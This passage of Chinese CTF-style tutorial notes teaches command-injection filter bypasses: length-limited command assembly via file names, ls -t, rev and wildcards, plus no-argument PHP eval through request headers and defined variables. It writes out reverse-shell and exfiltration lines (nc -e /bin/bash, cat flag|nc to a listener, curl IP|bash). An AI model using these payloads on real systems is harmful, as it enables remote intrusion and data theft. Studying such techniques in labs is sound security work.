class="hljs-string">&quot;right!&quot;</span>;<span class="hljs-keyword">fi</span></span><br></code></pre></td></tr></table></figure><p>if[]里的判断语句为真，则执行echo”right”; 否则执行fi结束</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">if</span> [$(<span class="hljs-built_in">cat</span> flag |awk NR==2 | <span class="hljs-built_in">cut</span> -c 1) == F];<span class="hljs-keyword">then</span> <span class="hljs-built_in">sleep</span> 2;<span class="hljs-keyword">fi</span></span><br></code></pre></td></tr></table></figure><p>if[]里的判断语句为真，则执行sleep 2，休眠2秒后返回结果</p><h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><p><strong><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-32.png"></strong></p><h2 id="长度过滤绕过"><a href="#长度过滤绕过" class="headerlink" title="长度过滤绕过"></a>长度过滤绕过</h2><h3 id="相关命令-1"><a href="#相关命令-1" class="headerlink" title="相关命令"></a>相关命令</h3><h4 id="符号和-符号"><a href="#符号和-符号" class="headerlink" title="&gt;符号和&gt;&gt;符号"></a>&gt;符号和&gt;&gt;符号</h4><p>1.通过&gt;来创建文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#echo benben &gt; a</span><br>创建文件<span class="hljs-keyword">a</span>，并把字符串<span class="hljs-string">&quot;benben&quot;</span>写入到文件<span class="hljs-keyword">a</span>里<br></code></pre></td></tr></table></figure><p>通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#echo</span> <span class="hljs-selector-tag">dazhuang</span> &gt; <span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p>2.通过&gt;&gt;来追加内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#echo</span> benben &gt;&gt; <span class="hljs-selector-tag">a</span><br>在原本文件内容后面追加<span class="hljs-string">&quot;benben&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">#&gt; <span class="hljs-selector-tag">b</span><br>直接创建文件<span class="hljs-selector-tag">b</span>，类似touch <span class="hljs-selector-tag">b</span><br></code></pre></td></tr></table></figure><h4 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h4><p>在没有写完的命令后面加”\“，可以将一条1命令写在多行</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#cat</span> <span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#c</span>\<br><span class="hljs-selector-tag">a</span>\<br><span class="hljs-selector-tag">t</span> \<br><span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p>相当于\把换行的命令连接到一起执行</p><h4 id="ls-t命令"><a href="#ls-t命令" class="headerlink" title="ls -t命令"></a>ls -t命令</h4><p>将文件名按照时间顺序排列出来（后创建的排在前面）</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#ls</span><br><span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">c</span><br>按字母顺序显示文件名<br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#ls</span> <span class="hljs-selector-tag">-t</span><br><span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">c</span> <span class="hljs-selector-tag">a</span><br>按时间顺序显示文件名<br>（后创建的排在前面）<br></code></pre></td></tr></table></figure><p>注意：只能精确到秒</p><p>组合运用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;ag</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;fl</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;<span class="hljs-string">&quot;t &quot;</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;<span class="hljs-built_in">cat</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">ls</span> -t</span><br>ca &#x27;t &#x27; fl ag<br></code></pre></td></tr></table></figure><p>按时间顺序反向依次创建文件</p><p>“ca” “t “ “fl” “ag”</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">ls</span> -t &gt; x</span><br></code></pre></td></tr></table></figure><p>创建文件x，并把’ls -t’执行结果写入文件x里</p><h4 id="组合运用"><a href="#组合运用" class="headerlink" title="组合运用"></a>组合运用</h4><p><strong>ls -t 命令列出文件名，然后每个文件名按行储存</strong></p><p><strong>在创建文件时，假如”\“，把命令”ca” “t “ “fl” “ag”连接起来</strong></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">#&gt;ag<br>#&gt;fl\\<br>#&gt;<span class="hljs-string">&quot;t \\&quot;</span><br>#&gt;ca\\<br>#ls -t &gt; a<br></code></pre></td></tr></table></figure><p><strong>\\前面的\把后面的\实体化变成字符</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#cat a</span><br>a<br>ca<span class="hljs-string">\</span><br>t <span class="hljs-string">\</span><br>fl<span class="hljs-string">\</span><br>ag<br>flag<br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#sh</span> <span class="hljs-selector-tag">a</span><br>#. <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-id">#zsh</span> <span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p>sh命令是shell命令语言解释器</p><p>执行命令从标准输入读取或从一个文件中读取</p><hr><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>对命令有长度限制时</strong></p><p><strong>把一些很短的文件名拼接成可执行命令</strong></p><p><strong>步骤：</strong></p><ul><li><strong>创建很短的文件名</strong></li><li><strong>ls -t按时间顺序列出文件名，按行储存</strong></li><li><strong>\连接换行命令</strong></li><li><strong>sh从文件中读取命令</strong></li></ul><h4 id="dir及-和rev"><a href="#dir及-和rev" class="headerlink" title="dir及 *和rev"></a>dir及 *和rev</h4><p><strong>dir:基本和ls一样，但有两个好处：</strong></p><p>一是开头字母是d，这使得它在alphabetical序中靠前</p><p>二是按列输出，不换行</p><p>*<em>*：相当于$(dir <em>)</em></em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#dir *</span><br><span class="hljs-built_in">echo</span> ffff<br></code></pre></td></tr></table></figure><p>这里echo改成cat可以直接查看文件的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#$(dir *)</span><br>ffff$(<span class="hljs-built_in">echo</span> ffff)<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#*</span><br>ffff<br></code></pre></td></tr></table></figure><p><strong>如果第一个文件名是命令的话就会执行命令，</strong></p><p><strong>返回执行的结果，之后的文件名作为参数传入</strong></p><hr><p><strong>rev：可以反转文件每一行的内容</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag</span><br>12345<br>67890<br><span class="hljs-meta prompt_"># </span><span class="language-bash">rev flag</span><br>54321<br>09876<br></code></pre></td></tr></table></figure><h3 id="长度为7绕过方法解析"><a href="#长度为7绕过方法解析" class="headerlink" title="长度为7绕过方法解析"></a>长度为7绕过方法解析</h3><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-33.png"></p><p>期望执行的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag|nc 192.168.1.161 7777</span><br></code></pre></td></tr></table></figure><p>kali的ip地址192.168.1.161</p><p>监听端口7777</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">监听方法：</span><br><span class="hljs-string">nc</span> <span class="hljs-string">-lvp</span> <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p>cat flag展示内容，再通过nc反弹提交到192.168.1.161:7777</p><p>拼接的步骤：</p><ul><li>&gt;创建很短的的文件名</li><li>ls -t按时间顺序列出文件名，按行储存</li><li>\连接换行命令</li><li>sh从文件中读取命令</li></ul><p><strong>步骤一：创建文件</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-34.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-35.png"></p><p><strong>步骤二：将文件名按顺序写入到文件</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span> -t&gt;a</span><br></code></pre></td></tr></table></figure><p><strong>步骤三：执行脚本</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=sh a<br></code></pre></td></tr></table></figure><p><strong>python脚本：</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-36.png"></p><p><strong>nc反弹shell</strong></p><p><strong>在 Kali Linux 上监听连接</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nc -lvp <span class="hljs-tag">&lt;<span class="hljs-name">监听端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <strong>在目标主机上发起连接请求</strong></p><p>linux</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nc -e /bin/bash <span class="hljs-tag">&lt;<span class="hljs-name">kali的IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">kali监听端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p>windows</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nc -e cmd.exe <span class="hljs-tag">&lt;<span class="hljs-name">kali的IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">kali监听端口</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="长度为5绕过方法解析"><a href="#长度为5绕过方法解析" class="headerlink" title="长度为5绕过方法解析"></a>长度为5绕过方法解析</h3><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-37.png"></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ls -t&gt;a<br>字符串长度为<span class="hljs-number">7</span>，超过限制<span class="hljs-number">5</span><br><br>&gt;<span class="hljs-string">\</span> <span class="hljs-string">\\</span><br>构造空格的字符串长度最少为<span class="hljs-number">5</span>，超过一个空格便无法构造<br><br>长度限制为<span class="hljs-number">7</span>时的命令不再适用<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-38.png"></p><p><strong>构建命令</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">期望执行的命令<br>curl <span class="hljs-number">192.168</span>.<span class="hljs-number">1.161</span><span class="hljs-string">|bash</span><br></code></pre></td></tr></table></figure><p><strong>步骤一</strong>：构造ls-t&gt;y</p><p>ls默认排序无法正常排出“ls\”””“-t”“&gt;y”</p><p>“ls”默认会排在最后，无法正常执行命令的</p><p>所以：我们先创建文件ls\</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-built_in">ls</span>\</span><br></code></pre></td></tr></table></figure><p>在创建文件”_”，并把“ls\”写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>&gt;_<br></code></pre></td></tr></table></figure><p>再创建其他文件</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&gt;<span class="hljs-string">\</span> <span class="hljs-string">\\</span><br>&gt;-t<span class="hljs-string">\\</span><br>&gt;<span class="hljs-string">\&gt;y</span><br></code></pre></td></tr></table></figure><p>用&gt;&gt;把所有文件名追加到文件_</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>&gt;&gt;_<br></code></pre></td></tr></table></figure><p>最后sh_执行文件_中的内容，即创建文件y</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">sh_<br></code></pre></td></tr></table></figure><p><strong>步骤二：</strong>分解命令，创建文件</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-40.png"></p><p><strong>步骤三</strong>：执行脚本sh</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sh <span class="hljs-attribute">y</span><br></code></pre></td></tr></table></figure><p>执行命令curl 192.168.1.161|bash</p><p>反弹shell</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-41.png"></p><p>python脚本</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-42.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-43.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-44.png"></p><h3 id="长度为4绕过方法解析"><a href="#长度为4绕过方法解析" class="headerlink" title="长度为4绕过方法解析"></a>长度为4绕过方法解析</h3><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-45.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>&gt;&gt;_<br></code></pre></td></tr></table></figure><p>追加命令长度最少为5，超过4个，不再适用</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-46.png"></p><p><strong>步骤一：构造ls -t&gt;g</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;g\&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;t-***</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;sl</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;<span class="hljs-built_in">dir</span></span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># ls</span><br><span class="hljs-built_in">dir</span> <span class="hljs-string">&#x27;g&gt;&#x27;</span> <span class="hljs-built_in">sl</span> t-<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># *</span><br>g&gt; <span class="hljs-built_in">sl</span> t-<br></code></pre></td></tr></table></figure><p>按字母排序但是顺序不满足</p><p>可以在-t后面加h，不影响命令执行，但是可以改变排序</p><p>在第二步创建的时候创建</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># &gt;ht-</span><br></code></pre></td></tr></table></figure><p>这样就能实现顺序正确</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># ls</span><br><span class="hljs-built_in">dir</span> <span class="hljs-string">&#x27;g&gt;&#x27;</span> ht- <span class="hljs-built_in">sl</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># *</span><br>g&gt; ht- <span class="hljs-built_in">sl</span><br></code></pre></td></tr></table></figure><p><strong>然后：</strong>将*的执行内容写入v中</p><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">*&gt;v</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> v</span><br><span class="hljs-meta prompt_">g&gt; </span><span class="language-bash">ht- sl</span><br></code></pre></td></tr></table></figure><p>倒序排列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># rev v</span><br><span class="hljs-built_in">ls</span> -th &gt;g<br></code></pre></td></tr></table></figure><p>先创建一个rev，因为直接rev v要5个字符超过4个了，这里*v就相当于rev v</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># &gt;rev</span><br><span class="hljs-comment"># *v&gt;x</span><br><span class="hljs-comment"># cat x</span><br><span class="hljs-built_in">ls</span> -th &gt;g<br></code></pre></td></tr></table></figure><p>*<strong>v&gt;x解释：</strong></p><p><strong>此处*为通配符，前能匹配rev，后可执行v</strong></p><hr><p>x文件中的内容</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">x</span>:<span class="hljs-keyword">ls</span> -<span class="hljs-keyword">th</span> &gt;g<br></code></pre></td></tr></table></figure><p>完整构造步骤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">;\g</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">g\&gt;</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">ht-</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">sl</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-built_in">dir</span></span><br>*&gt;v<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">rev</span><br>*v&gt;x<br></code></pre></td></tr></table></figure><p><strong>为了防止”g”后面有其他文件名造成影响，可以多创建一个文件”;\g”，</strong></p><p><strong>用”;”阻断后面字符的影响</strong></p><p><strong>步骤二：构造一个反弹shell</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> <span class="hljs-number">192.168.1.161</span>|bash十进制<span class="hljs-number">192.168.1.161</span><br><span class="hljs-attribute">curl</span> <span class="hljs-number">0</span>xC0A801A1|bash十六进制<span class="hljs-number">0</span>xC0A801A1<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-48.png"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">curl <span class="hljs-number">0xC0A801A1</span>|bash<br>?<span class="hljs-function"><span class="hljs-params">cmd</span>=&gt;</span>sh x<br>?<span class="hljs-function"><span class="hljs-params">cmd</span>=&gt;</span>sh g<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-47.png"></p><p><strong>步骤三：反弹回来的shell查看flag</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-49.png"></p><h2 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h2><h3 id="HTTP-请求头绕过（php-7-3）"><a href="#HTTP-请求头绕过（php-7-3）" class="headerlink" title="HTTP 请求头绕过（php 7.3）"></a>HTTP 请求头绕过（php 7.3）</h3><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-50.png"></p><p>解析：</p><p> <img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-51.png"></p><p>​<img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-52.png"></p><p>所以这里只能提交函数，且函数内不能有参数</p><h4 id="HTTP-请求标头"><a href="#HTTP-请求标头" class="headerlink" title="HTTP 请求标头"></a>HTTP 请求标头</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getallheaders</span><span class="hljs-params">()</span></span>获取所有HTTP请求标头<br></code></pre></td></tr></table></figure><p>单独使用无法回显执行结果</p><p>所以配合print_r()函数使用</p><p><strong>在burpsuite中修改</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">getallheaders</span>())</span><br></code></pre></td></tr></table></figure><p>即可回显请求头部信息</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-53.png"></p><p>注意：提交的第一项是拿出的最后一项，在burpsuite中顺序是自下而上的</p><h4 id="绕过方法：-4"><a href="#绕过方法：-4" class="headerlink" title="绕过方法："></a><strong>绕过方法：</strong></h4><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-54.png"></p><hr><p><strong>可以用print_r()打印出来</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-55.png"></p><p><strong>也可以用pos()把第一项的值显示出来</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(pos(getallheaders()))<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-56.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-57.png"></p><p><strong>也可以用end()把最后一项的值显示出来</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-meta">code</span><span class="hljs-symbol">=print_r</span>(<span class="hljs-meta">end</span>(getallheaders()))<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-58.png"></p><p>把print_r改成eval，然后将请求头改为我们要执行的命令即可执行命令（可以自己添加请求头信息）</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-59.png"></p><hr><p><strong>使用apache_request_headers()</strong></p><p>​功能与getallheaders()相似，适用于Apache服务器</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">apache_request_headers</span>())</span><br></code></pre></td></tr></table></figure><p>使用system(‘nc 192.168.1.161 -e \bin\bash’);进行shell反弹</p><h3 id="利用全局变量进RCE（php5-7）"><a href="#利用全局变量进RCE（php5-7）" class="headerlink" title="利用全局变量进RCE（php5&#x2F;7）"></a>利用全局变量进RCE（php5&#x2F;7）</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">?code=<span class="hljs-keyword">eval</span>(end(<span class="hljs-keyword">pos</span>(get_defined_vars())));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>把print_r换成<span class="hljs-keyword">eval</span>、assert即可执行命令<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);可替换成其他命令<br></code></pre></td></tr></table></figure><p>例题还是上一道题<br>相关函数：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">get_defined_vars()<br>返回所有已定义变量的值，所组成的数组<br><br>?<span class="hljs-keyword">code</span>=print_r(get_defined_vars());<br>返回数组顺序为GET-&gt;POST-&gt;COOKIE-&gt;FILES<br></code></pre></td></tr></table></figure><p>返回结果：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-60.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">?code=print_r(<span class="hljs-keyword">pos</span>(get_defined_vars()));<br>加入<span class="hljs-keyword">pos</span>只获取第一项GET变量的值<br><br>?code=print_r(<span class="hljs-keyword">pos</span>(get_defined_vars()));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>&amp;加入想要获取的指令<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-61.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?code=print_r(<span class="hljs-keyword">end</span>(pos(get_defined_vars())));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">end</span>获取<span class="hljs-keyword">GET</span>的最后一项cmd的值<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-62.png"></p><p>最终代码：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 